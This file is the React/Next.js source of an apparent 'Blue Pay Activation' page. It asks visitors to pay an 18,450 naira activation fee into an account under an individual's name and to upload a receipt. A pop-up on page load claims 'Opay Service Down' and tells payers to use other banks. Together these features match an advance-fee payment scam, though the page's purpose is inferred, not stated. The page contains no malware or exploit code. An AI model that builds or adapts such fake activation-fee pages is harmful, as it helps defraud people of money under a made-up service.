"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"

export default function PaymentPage() {
  const router = useRouter()
  const [showModal, setShowModal] = useState(true)
  const [fileName, setFileName] = useState<string | null>(null)

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setFileName(e.target.files[0].name)
    }
  }

  const handleCloseModal = () => {
    setShowModal(false)
    // After modal closes, redirect to payment details after a brief delay
    setTimeout(() => {
      router.push("/activate/payment-details")
    }, 300)
  }

  return (
    <main className="min-h-screen bg-gray-100">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 py-4 px-4">
        <div className="max-w-2xl mx-auto flex items-center gap-6">
          {/* Logo */}
          <div className="w-16 h-16 bg-slate-900 flex items-center justify-center flex-shrink-0 rounded-sm">
            <svg className="w-8 h-8 text-blue-400" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z" />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-900">Blue Pay Activation</h1>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-2xl mx-auto px-4 py-8">
        {/* Payment Header */}
        <div className="mb-8">
          <h2 className="text-3xl font-bold text-gray-900 mb-2">Make Payment to Complete Activation</h2>
          <p className="text-gray-600 text-lg">Please make a payment of 18,450 naira to complete your activation</p>
          <div className="mt-4 flex items-start gap-3">
            <div className="text-blue-600 text-xl">ℹ️</div>
            <p className="text-blue-600">A settlement fee of NGN</p>
          </div>
        </div>

        {/* Payment Form Card */}
        <div className="bg-white rounded-lg p-8 shadow-sm">
          {/* Account Name */}
          <div className="mb-8">
            <label className="block text-gray-900 font-semibold mb-3">Account Name</label>
            <div className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-700 font-medium">
              OLUWAFEMI ARUWAYO
            </div>
          </div>

          {/* Amount */}
          <div className="mb-8">
            <label className="block text-gray-900 font-semibold mb-3">Amount</label>
            <div className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-700 font-medium">
              18,450 naira
            </div>
          </div>

          {/* Upload Payment Receipt */}
          <div className="mb-8">
            <label className="block text-gray-900 font-semibold mb-3">Upload Payment Receipt (PNG or JPG)</label>
            <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-blue-600 hover:bg-blue-50 transition cursor-pointer">
              <input
                type="file"
                accept=".png,.jpg,.jpeg"
                onChange={handleFileChange}
                className="hidden"
                id="receipt-upload"
              />
              <label htmlFor="receipt-upload" className="cursor-pointer block">
                <svg
                  className="w-12 h-12 text-gray-400 mx-auto mb-2"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                </svg>
                {fileName ? (
                  <p className="text-gray-700 font-medium">{fileName}</p>
                ) : (
                  <>
                    <p className="text-gray-600">Drag and drop or click to upload</p>
                    <p className="text-sm text-gray-500">PNG or JPG</p>
                  </>
                )}
              </label>
            </div>
          </div>

          {/* Submit Button */}
          <button className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition">
            Submit Payment
          </button>
        </div>
      </div>

      {/* Opay Service Down Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4">
          <div className="bg-white rounded-xl p-8 max-w-md w-full shadow-2xl">
            {/* Icon */}
            <div className="flex justify-center mb-6">
              <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center">
                <svg className="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z" />
                </svg>
              </div>
            </div>

            {/* Title */}
            <h3 className="text-2xl font-bold text-red-600 text-center mb-4">Opay Service Down</h3>

            {/* Message */}
            <p className="text-gray-700 text-center mb-6">Please do not use Opay bank for payments at this time.</p>

            {/* Alert Box */}
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
              <p className="text-red-700 text-center font-medium">
                The Opay bank service is currently experiencing issues. Please use other supported banks for your
                payment.
              </p>
            </div>

            {/* Button */}
            <button
              onClick={handleCloseModal}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition"
            >
              I Understand
            </button>
          </div>
        </div>
      )}
    </main>
  )
}
